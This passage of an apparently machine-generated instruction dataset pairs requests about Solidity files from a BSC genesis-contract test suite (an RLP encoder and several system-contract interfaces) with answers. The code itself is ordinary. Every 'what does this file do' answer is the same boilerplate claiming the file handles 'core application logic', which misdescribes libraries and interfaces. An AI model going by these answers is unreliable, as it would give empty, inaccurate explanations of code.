mergeBytes(rs, bl);\n    }\n\n    /**\n     * @notice Encode integer in big endian binary form with no leading zeroes\n     * @param x The integer to encode\n     * @return RLP encoded bytes\n     */\n    function toBinary(uint256 x) internal pure returns (bytes memory) {\n        bytes memory b = new bytes(32);\n        assembly {\n            mstore(add(b, 32), x)\n        }\n        uint256 i;\n        if (x & 0xffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000 == 0) {\n            i = 24;\n        } else if (x & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 == 0) {\n            i = 16;\n        } else {\n            i = 0;\n        }\n        for (; i < 32; ++i) {\n            if (b[i] != 0) {\n                break;\n            }\n        }\n        uint256 length = 32 - i;\n        bytes memory rs = new bytes(length);\n        assembly {\n            mstore(add(rs, length), x)\n            mstore(rs, length)\n        }\n        return rs;\n    }\n}\n\n```"}
{"instruction": "What does the file RLPEncode.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\n/**\n * @dev RLP encoding library.\n * This file is a bit modified from the original version in `contracts/lib` because of different Solidity versions.\n */\nlibrary RLPEncode {\n    uint8 constant STRING_OFFSET = 0x80;\n    uint8 constant LIST_OFFSET = 0xc0;\n\n    /**\n     * @notice Encode string item\n     * @param self The string (ie. byte array) item to encode\n     * @return The RLP encoded string in bytes\n     */\n    function encodeBytes(bytes memory self) internal pure returns (bytes memory) {\n        if (self.length == 1 && self[0] <= 0x7f) {\n            return self;\n        }\n        return mergeBytes(encodeLength(self.length, STRING_OFFSET), self);\n    }\n\n    /**\n     * @notice Encode address\n     * @param self The address to encode\n     * @return The RLP encoded address in bytes\n     */\n    function encodeAddress(address self) internal pure returns (bytes memory) {\n        bytes memory b;\n        assembly {\n            b := mload(0x40)\n            mstore(b, 0x20)\n            mstore(add(b, 20), xor(0x140000000000000000000000000000000000000000, self))\n            mstore(0x40, add(b, 0x40))\n        }\n        return encodeBytes(b);\n    }\n\n    /**\n     * @notice Encode uint\n     * @param self The uint to encode\n     * @return The RLP encoded uint in bytes\n     */\n    function encodeUint(uint256 self) internal pure returns (bytes memory) {\n        return encodeBytes(toBinary(self));\n    }\n\n    /**\n     * @notice Encode int\n     * @param self The int to encode\n     * @return The RLP encoded int in bytes\n     */\n    function encodeInt(int256 self) internal pure returns (bytes memory) {\n        return encodeUint(uint256(self));\n    }\n\n    /**\n     * @notice Encode bool\n     * @param self The bool to encode\n     * @return The RLP encoded bool in bytes\n     */\n    function encodeBool(bool self) internal pure returns (bytes memory) {\n        bytes memory rs = new bytes(1);\n        rs[0] = (self ? bytes1(0x01) : bytes1(0x80));\n        return rs;\n    }\n```", "output": "This file `RLPEncode.sol` is part of the utils project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCGovernor.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IBSCGovernor.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCGovernor {\n    type ProposalState is uint8;\n\n    struct Receipt {\n        bool hasVoted;\n        uint8 support;\n        uint96 votes;\n    }\n\n    error AlreadyPaused();\n    error Empty();\n    error InBlackList();\n    error InvalidValue(string key, bytes value);\n    error NotPaused();\n    error NotWhitelisted();\n    error OneLiveProposalPerProposer();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TotalSupplyNotEnough();\n    error UnknownParam(string key, bytes value);\n\n    event BlackListed(address indexed target);\n    event EIP712DomainChanged();\n    event Initialized(uint8 version);\n    event LateQuorumVoteExtensionSet(uint64 oldVoteExtension, uint64 newVoteExtension);\n    event ParamChange(string key, bytes value);\n    event Paused();\n    event ProposalCanceled(uint256 proposalId);\n    event ProposalCreated(\n        uint256 proposalId,\n        address proposer,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        uint256 voteStart,\n        uint256 voteEnd,\n        string description\n    );\n    event ProposalExecuted(uint256 proposalId);\n    event ProposalExtended(uint256 indexed proposalId, uint64 extendedDeadline);\n    event ProposalQueued(uint256 proposalId, uint256 eta);\n    event ProposalThresholdSet(uint256 oldProposalThreshold, uint256 newProposalThreshold);\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event QuorumNumeratorUpdated(uint256 oldQuorumNumerator, uint256 newQuorumNumerator);\n    event Resumed();\n    event TimelockChange(address oldTimelock, address newTimelock);\n    event UnBlackListed(address indexed target);\n    event VoteCast(address indexed voter, uint256 proposalId, uint8 support, uint256 weight, string reason);\n    event VoteCastWithParams(\n        address indexed voter, uint256 proposalId, uint8 support, uint256 weight, string reason, bytes params\n    );\n    event VotingDelaySet(uint256 oldVotingDelay, uint256 newVotingDelay);\n    event VotingPeriodSet(uint256 oldVotingPeriod, uint256 newVotingPeriod);\n\n    receive() external payable;\n\n    function BALLOT_TYPEHASH() external view returns (bytes32);\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function CLOCK_MODE() external view returns (string memory);\n    function COUNTING_MODE() external pure returns (string memory);\n    function EXTENDED_BALLOT_TYPEHASH() external view returns (bytes32);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function addToBlackList(address account) external;\n    function blackList(address) external view returns (bool);\n    function cancel(uint256 proposalId) external;\n    function cancel(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) external returns (uint256);\n    function castVote(uint256 proposalId, uint8 support) external returns (uint256);\n    function castVoteBySig(\n        uint256 proposalId,\n        uint8 support,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256);\n    function castVoteWithReason(uint256 proposalId, uint8 support, string memory reason) external returns (uint256);\n    function castVoteWithReasonAndParams(\n        uint256 proposalId,\n        uint8 support,\n        string memory reason,\n        bytes memory params\n    ) external returns (uint256);\n    function castVoteWithReasonAndParamsBySig(\n        uint256 proposalId,\n        uint8 support,\n        string memory reason,\n        bytes memory params,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external returns (uint256);\n    function clock() external view returns (uint48);\n    function eip712Domain()\n        external\n        view\n        returns (\n            bytes1 fields,\n            string memory name,\n            string memory version,\n            uint256 chainId,\n            address verifyingContract,\n            bytes32 salt,\n            uint256[] memory extensions\n        );\n    function execute(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) external payable returns (uint256);\n    function execute(uint256 proposalId) external payable;\n    function getActions(uint256 proposalId)\n        external\n        view\n        returns (\n            address[] memory targets,\n            uint256[] memory values,\n            string[] memory signatures,\n            bytes[] memory calldatas\n        );\n    function getReceipt(uint256 proposalId, address voter) external view returns (Receipt memory);\n    function getVotes(address account, uint256 timepoint) external view returns (uint256);\n    function getVotesWithParams(\n        address account,\n        uint256 timepoint,\n        bytes memory params\n    ) external view returns (uint256);\n    function hasVoted(uint256 proposalId, address account) external view returns (bool);\n    function hashProposal(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) external pure returns (uint256);\n    function initialize() external;\n    function isPaused() external view returns (bool);\n    function lateQuorumVoteExtension() external view returns (uint64);\n    function latestProposalIds(address) external view returns (uint256);\n    function name() external view returns (string memory);\n    function onERC1155BatchReceived(\n        address,\n        address,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) external returns (bytes4);\n    function onERC1155Received(address, address, uint256, uint256, bytes memory) external returns (bytes4);\n    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4);\n    function pause() external;\n    function proposalDeadline(uint256 proposalId) external view returns (uint256);\n    function proposalEta(uint256 proposalId) external view returns (uint256);\n    function proposalProposer(uint256 proposalId) external view returns (address);\n    function proposalSnapshot(uint256 proposalId) external view returns (uint256);\n    function proposalThreshold() external view returns (uint256);\n    function proposals(uint256 proposalId)\n        external\n        view\n        returns (\n            uint256 id,\n            address proposer,\n            uint256 eta,\n            uint256 startBlock,\n            uint256 endBlock,\n            uint256 forVotes,\n            uint256 againstVotes,\n            uint256 abstainVotes,\n            bool canceled,\n            bool executed\n        );\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n    function proposeStarted() external view returns (bool);\n    function queue(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) external returns (uint256 proposalId);\n    function queue(uint256 proposalId) external;\n    function quorum(uint256 timepoint) external view returns (uint256);\n    function quorumDenominator() external view returns (uint256);\n    function quorumNumerator(uint256 timepoint) external view returns (uint256);\n    function quorumNumerator() external view returns (uint256);\n    function quorumVotes() external view returns (uint256);\n    function relay(address target, uint256 value, bytes memory data) external payable;\n    function removeFromBlackList(address account) external;\n    function resume() external;\n    function setLateQuorumVoteExtension(uint64 newVoteExtension) external;\n    function setProposalThreshold(uint256 newProposalThreshold) external;\n    function setVotingDelay(uint256 newVotingDelay) external;\n    function setVotingPeriod(uint256 newVotingPeriod) external;\n    function state(uint256 proposalId) external view returns (ProposalState);\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    function timelock() external view returns (address);\n    function token() external view returns (address);\n    function updateParam(string memory key, bytes memory value) external;\n    function updateQuorumNumerator(uint256 newQuorumNumerator) external;\n    function updateTimelock(address newTimelock) external;\n    function version() external view returns (string memory);\n    function votingDelay() external view returns (uint256);\n    function votingPeriod() external view returns (uint256);\n    function whitelistTargets(address) external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IBSCGovernor.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCGovernor {\n    type ProposalState is uint8;\n\n    struct Receipt {\n        bool hasVoted;\n        uint8 support;\n        uint96 votes;\n    }\n\n    error AlreadyPaused();\n    error Empty();\n    error InBlackList();\n    error InvalidValue(string key, bytes value);\n    error NotPaused();\n    error NotWhitelisted();\n    error OneLiveProposalPerProposer();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TotalSupplyNotEnough();\n    error UnknownParam(string key, bytes value);\n\n    event BlackListed(address indexed target);\n    event EIP712DomainChanged();\n    event Initialized(uint8 version);\n    event LateQuorumVoteExtensionSet(uint64 oldVoteExtension, uint64 newVoteExtension);\n    event ParamChange(string key, bytes value);\n    event Paused();\n    event ProposalCanceled(uint256 proposalId);\n    event ProposalCreated(\n        uint256 proposalId,\n        address proposer,\n        address[] targets,\n        uint256[] values,\n        string[] signatures,\n        bytes[] calldatas,\n        uint256 voteStart,\n        uint256 voteEnd,\n        string description\n    );\n    event ProposalExecuted(uint256 proposalId);\n    event ProposalExtended(uint256 indexed proposalId, uint64 extendedDeadline);\n    event ProposalQueued(uint256 proposalId, uint256 eta);\n    event ProposalThresholdSet(uint256 oldProposalThreshold, uint256 newProposalThreshold);\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event QuorumNumeratorUpdated(uint256 oldQuorumNumerator, uint256 newQuorumNumerator);\n    event Resumed();\n    event TimelockChange(address oldTimelock, address newTimelock);\n    event UnBlackListed(address indexed target);\n    event VoteCast(address indexed voter, uint256 proposalId, uint8 support, uint256 weight, string reason);\n    event VoteCastWithParams(\n        address \n```", "output": "This file `IBSCGovernor.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCTimelock.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IBSCTimelock.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCTimelock {\n    error InvalidValue(string key, bytes value);\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error UnknownParam(string key, bytes value);\n\n    event CallExecuted(bytes32 indexed id, uint256 indexed index, address target, uint256 value, bytes data);\n    event CallSalt(bytes32 indexed id, bytes32 salt);\n    event CallScheduled(\n        bytes32 indexed id,\n        uint256 indexed index,\n        address target,\n        uint256 value,\n        bytes data,\n        bytes32 predecessor,\n        uint256 delay\n    );\n    event Cancelled(bytes32 indexed id);\n    event Initialized(uint8 version);\n    event MinDelayChange(uint256 oldDuration, uint256 newDuration);\n    event ParamChange(string key, bytes value);\n    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);\n    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function CANCELLER_ROLE() external view returns (bytes32);\n    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);\n    function EXECUTOR_ROLE() external view returns (bytes32);\n    function PROPOSER_ROLE() external view returns (bytes32);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function TIMELOCK_ADMIN_ROLE() external view returns (bytes32);\n    function cancel(bytes32 id) external;\n    function execute(\n        address target,\n        uint256 value,\n        bytes memory payload,\n        bytes32 predecessor,\n        bytes32 salt\n    ) external payable;\n    function executeBatch(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory payloads,\n        bytes32 predecessor,\n        bytes32 salt\n    ) external payable;\n    function getMinDelay() external view returns (uint256);\n    function getRoleAdmin(bytes32 role) external view returns (bytes32);\n    function getTimestamp(bytes32 id) external view returns (uint256);\n    function grantRole(bytes32 role, address account) external;\n    function hasRole(bytes32 role, address account) external view returns (bool);\n    function hashOperation(\n        address target,\n        uint256 value,\n        bytes memory data,\n        bytes32 predecessor,\n        bytes32 salt\n    ) external pure returns (bytes32);\n    function hashOperationBatch(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory payloads,\n        bytes32 predecessor,\n        bytes32 salt\n    ) external pure returns (bytes32);\n    function initialize() external;\n    function isOperation(bytes32 id) external view returns (bool);\n    function isOperationDone(bytes32 id) external view returns (bool);\n    function isOperationPending(bytes32 id) external view returns (bool);\n    function isOperationReady(bytes32 id) external view returns (bool);\n    function onERC1155BatchReceived(\n        address,\n        address,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) external returns (bytes4);\n    function onERC1155Received(address, address, uint256, uint256, bytes memory) external returns (bytes4);\n    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4);\n    function renounceRole(bytes32 role, address account) external;\n    function revokeRole(bytes32 role, address account) external;\n    function schedule(\n        address target,\n        uint256 value,\n        bytes memory data,\n        bytes32 predecessor,\n        bytes32 salt,\n        uint256 delay\n    ) external;\n    function scheduleBatch(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory payloads,\n        bytes32 predecessor,\n        bytes32 salt,\n        uint256 delay\n    ) external;\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    function updateDelay(uint256 newDelay) external;\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file IBSCTimelock.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCTimelock {\n    error InvalidValue(string key, bytes value);\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error UnknownParam(string key, bytes value);\n\n    event CallExecuted(bytes32 indexed id, uint256 indexed index, address target, uint256 value, bytes data);\n    event CallSalt(bytes32 indexed id, bytes32 salt);\n    event CallScheduled(\n        bytes32 indexed id,\n        uint256 indexed index,\n        address target,\n        uint256 value,\n        bytes data,\n        bytes32 predecessor,\n        uint256 delay\n    );\n    event Cancelled(bytes32 indexed id);\n    event Initialized(uint8 version);\n    event MinDelayChange(uint256 oldDuration, uint256 newDuration);\n    event ParamChange(string key, bytes value);\n    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);\n    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function CANCELLER_ROLE() external view returns (bytes32);\n    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);\n    function EXECUTOR_ROLE() external view returns (bytes32);\n    function PROPOSER_ROLE() external view returns (bytes32);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function TIMELOCK_ADMIN_ROLE() external view returns (bytes32);\n    function cancel(bytes32 id) external;\n    function execute(\n        address target,\n        uint256 value,\n        bytes memory payload,\n        bytes32 predecessor,\n        bytes32 salt\n    ) external payable;\n    function executeBatch(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory payloads,\n   \n```", "output": "This file `IBSCTimelock.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCValidatorSet.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IBSCValidatorSet.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCValidatorSet {\n    event batchTransfer(uint256 amount);\n    event batchTransferFailed(uint256 indexed amount, string reason);\n    event batchTransferLowerFailed(uint256 indexed amount, bytes reason);\n    event deprecatedDeposit(address indexed validator, uint256 amount);\n    event deprecatedFinalityRewardDeposit(address indexed validator, uint256 amount);\n    event directTransfer(address payable indexed validator, uint256 amount);\n    event directTransferFail(address payable indexed validator, uint256 amount);\n    event failReasonWithStr(string message);\n    event feeBurned(uint256 amount);\n    event finalityRewardDeposit(address indexed validator, uint256 amount);\n    event paramChange(string key, bytes value);\n    event systemTransfer(uint256 amount);\n    event tmpValidatorSetUpdated(uint256 validatorsNum);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n    event validatorDeposit(address indexed validator, uint256 amount);\n    event validatorEmptyJailed(address indexed validator);\n    event validatorEnterMaintenance(address indexed validator);\n    event validatorExitMaintenance(address indexed validator);\n    event validatorFelony(address indexed validator, uint256 amount);\n    event validatorJailed(address indexed validator);\n    event validatorMisdemeanor(address indexed validator, uint256 amount);\n    event validatorSetUpdated();\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function BLOCK_FEES_RATIO_SCALE() external view returns (uint256);\n    function BURN_ADDRESS() external view returns (address);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function DUSTY_INCOMING() external view returns (uint256);\n    function ERROR_FAIL_CHECK_VALIDATORS() external view returns (uint32);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function ERROR_LEN_OF_VAL_MISMATCH() external view returns (uint32);\n    function ERROR_RELAYFEE_TOO_LARGE() external view returns (uint32);\n    function ERROR_UNKNOWN_PACKAGE_TYPE() external view returns (uint32);\n    function EXPIRE_TIME_SECOND_GAP() external view returns (uint256);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_BURN_RATIO() external view returns (uint256);\n    function INIT_MAINTAIN_SLASH_SCALE() external view returns (uint256);\n    function INIT_MAX_NUM_OF_MAINTAINING() external view returns (uint256);\n    function INIT_NUM_OF_CABINETS() external view returns (uint256);\n    function INIT_SYSTEM_REWARD_RATIO() external view returns (uint256);\n    function INIT_VALIDATORSET_BYTES() external view returns (bytes memory);\n    function JAIL_MESSAGE_TYPE() external view returns (uint8);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MAX_NUM_OF_VALIDATORS() external view returns (uint256);\n    function MAX_SYSTEM_REWARD_BALANCE() external view returns (uint256);\n    function PRECISION() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATORS_UPDATE_MESSAGE_TYPE() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function systemRewardAntiMEVRatio() external view returns (uint256);\n    function bscChainID() external view returns (uint16);\n    function burnRatio() external view returns (uint256);\n    function burnRatioInitialized() external view returns (bool);\n    function canEnterMaintenance(uint256 index) external view returns (bool);\n    function currentValidatorSet(uint256)\n        external\n        view\n        returns (\n            address consensusAddress,\n            address payable feeAddress,\n            address BBCFeeAddress,\n            uint64 votingPower,\n            bool jailed,\n            uint256 incoming\n        );\n    function currentValidatorSetMap(address) external view returns (uint256);\n    function currentVoteAddrFullSet(uint256) external view returns (bytes memory);\n    function deposit(address valAddr) external payable;\n    function distributeFinalityReward(address[] memory valAddrs, uint256[] memory weights) external;\n    function enterMaintenance() external;\n    function exitMaintenance() external;\n    function expireTimeSecondGap() external view returns (uint256);\n    function felony(address validator) external;\n    function getCurrentValidatorIndex(address validator) external view returns (uint256);\n    function getIncoming(address validator) external view returns (uint256);\n    function getLivingValidators() external view returns (address[] memory, bytes[] memory);\n    function getMiningValidators() external view returns (address[] memory, bytes[] memory);\n    function getTurnLength() external view returns (uint256);\n    function getValidators() external view returns (address[] memory);\n    function getWorkingValidatorCount() external view returns (uint256 workingValidatorCount);\n    function handleAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleSynPackage(uint8, bytes memory msgBytes) external returns (bytes memory responsePayload);\n    function init() external;\n    function systemRewardBaseRatio() external view returns (uint256);\n    function isCurrentValidator(address validator) external view returns (bool);\n    function isMonitoredForMaliciousVote(bytes memory voteAddr) external view returns (bool);\n    function isSystemRewardIncluded() external view returns (bool);\n    function isWorkingValidator(uint256 index) external view returns (bool);\n    function maintainSlashScale() external view returns (uint256);\n    function maxNumOfCandidates() external view returns (uint256);\n    function maxNumOfMaintaining() external view returns (uint256);\n    function maxNumOfWorkingCandidates() external view returns (uint256);\n    function misdemeanor(address validator) external;\n    function numOfCabinets() external view returns (uint256);\n    function numOfJailed() external view returns (uint256);\n    function numOfMaintaining() external view returns (uint256);\n    function previousBalanceOfSystemReward() external view returns (uint256);\n    function previousHeight() external view returns (uint256);\n    function previousVoteAddrFullSet(uint256) external view returns (bytes memory);\n    function removeTmpMigratedValidator(address validator) external;\n    function totalInComing() external view returns (uint256);\n    function turnLength() external view returns (uint256);\n    function updateParam(string memory key, bytes memory value) external;\n    function updateValidatorSetV2(\n        address[] memory _consensusAddrs,\n        uint64[] memory _votingPowers,\n        bytes[] memory _voteAddrs\n    ) external;\n    function validatorExtraSet(uint256)\n        external\n        view\n        returns (uint256 enterMaintenanceHeight, bool isMaintaining, bytes memory voteAddress);\n}\n\n```"}
{"instruction": "What does the file IBSCValidatorSet.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCValidatorSet {\n    event batchTransfer(uint256 amount);\n    event batchTransferFailed(uint256 indexed amount, string reason);\n    event batchTransferLowerFailed(uint256 indexed amount, bytes reason);\n    event deprecatedDeposit(address indexed validator, uint256 amount);\n    event deprecatedFinalityRewardDeposit(address indexed validator, uint256 amount);\n    event directTransfer(address payable indexed validator, uint256 amount);\n    event directTransferFail(address payable indexed validator, uint256 amount);\n    event failReasonWithStr(string message);\n    event feeBurned(uint256 amount);\n    event finalityRewardDeposit(address indexed validator, uint256 amount);\n    event paramChange(string key, bytes value);\n    event systemTransfer(uint256 amount);\n    event tmpValidatorSetUpdated(uint256 validatorsNum);\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);\n    event validatorDeposit(address indexed validator, uint256 amount);\n    event validatorEmptyJailed(address indexed validator);\n    event validatorEnterMaintenance(address indexed validator);\n    event validatorExitMaintenance(address indexed validator);\n    event validatorFelony(address indexed validator, uint256 amount);\n    event validatorJailed(address indexed validator);\n    event validatorMisdemeanor(address indexed validator, uint256 amount);\n    event validatorSetUpdated();\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function BLOCK_FEES_RATIO_SCALE() external view returns (uint256);\n    function BURN_ADDRESS() external view returns (address);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function DUSTY_INCOMING() external view returns (uint256\n```", "output": "This file `IBSCValidatorSet.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IBSCValidatorSetTool.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IBSCValidatorSetTool.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCValidatorSetTool {\n    function INIT_VALIDATORSET_BYTES() external view returns (bytes memory);\n    function decodePayloadHeader(bytes memory payload) external pure returns (bool, uint8, uint256, bytes memory);\n    function init() external pure;\n}\n\n```"}
{"instruction": "What does the file IBSCValidatorSetTool.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface BSCValidatorSetTool {\n    function INIT_VALIDATORSET_BYTES() external view returns (bytes memory);\n    function decodePayloadHeader(bytes memory payload) external pure returns (bool, uint8, uint256, bytes memory);\n    function init() external pure;\n}\n\n```", "output": "This file `IBSCValidatorSetTool.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ICrossChain.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ICrossChain.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface CrossChain {\n    event ProposalSubmitted(\n        bytes32 indexed proposalTypeHash,\n        address indexed proposer,\n        uint128 quorum,\n        uint128 expiredAt,\n        bytes32 contentHash\n    );\n    event Reopened(address indexed executor);\n    event SuccessChallenge(address indexed challenger, uint64 packageSequence, uint8 channelId);\n    event Suspended(address indexed executor);\n    event addChannel(uint8 indexed channelId, address indexed contractAddr);\n    event crossChainPackage(\n        uint16 chainId,\n        uint64 indexed oracleSequence,\n        uint64 indexed packageSequence,\n        uint8 indexed channelId,\n        bytes payload\n    );\n    event enableOrDisableChannel(uint8 indexed channelId, bool isEnable);\n    event paramChange(string key, bytes value);\n    event receivedPackage(uint8 packageType, uint64 indexed packageSequence, uint8 indexed channelId);\n    event unexpectedFailureAssertionInPackageHandler(address indexed contractAddr, bytes lowLevelData);\n    event unexpectedRevertInPackageHandler(address indexed contractAddr, string reason);\n    event unsupportedPackage(uint64 indexed packageSequence, uint8 indexed channelId, bytes payload);\n\n    function ACK_PACKAGE() external view returns (uint8);\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CANCEL_TRANSFER_PROPOSAL() external view returns (bytes32);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_CHAIN_KEY_PREFIX() external view returns (uint256);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function EMERGENCY_PROPOSAL_EXPIRE_PERIOD() external view returns (uint256);\n    function EMPTY_CONTENT_HASH() external view returns (bytes32);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function FAIL_ACK_PACKAGE() external view returns (uint8);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_BATCH_SIZE() external view returns (uint256);\n    function INIT_CANCEL_TRANSFER_QUORUM() external view returns (uint16);\n    function INIT_REOPEN_QUORUM() external view returns (uint16);\n    function INIT_SUSPEND_QUORUM() external view returns (uint16);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function REOPEN_PROPOSAL() external view returns (bytes32);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function STORE_NAME() external view returns (string memory);\n    function SUSPEND_PROPOSAL() external view returns (bytes32);\n    function SYN_PACKAGE() external view returns (uint8);\n    function 